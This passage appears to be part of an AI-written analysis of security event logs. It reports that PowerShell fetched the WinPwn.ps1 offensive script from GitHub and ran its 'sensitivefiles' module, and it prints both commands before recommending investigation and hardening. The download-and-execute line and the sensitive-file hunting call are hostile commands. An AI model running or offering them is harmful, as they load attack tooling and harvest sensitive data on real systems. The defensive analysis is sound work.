A file named `WinPwn.ps1` is created in a temporary directory.\n        ```\n        new-object net.webclient).downloadstring('https:\\\/\\\/raw.githubusercontent.com\\\/S3cur3Th1sSh1t\\\/WinPwn\\\/121dcee26a7aca368821563cbe92b2b5638c5773\\\/WinPwn.ps1')\n        ```\n     2. The file `WinPwn.ps1` is then executed.\n        ```\n        sensitivefiles -noninteractive -consoleoutput\n        ```\n\nBased on these events, it appears that a script (`WinPwn.ps1`) was fetched from a public GitHub repository and executed using PowerShell. This could potentially indicate a suspicious or malicious activity, depending on the content of `WinPwn.ps1`. However, without further context or analyzing the downloaded script, it's difficult to determine the exact nature of this activity.\n\nIt's recommended to monitor these activities further, investigate the source repository, and analyze the downloaded script for potential threats. Additionally, consider implementing security measures such as application whitelisting, script execution policies, and regular system hardening to prevent unauthorized script execution."}
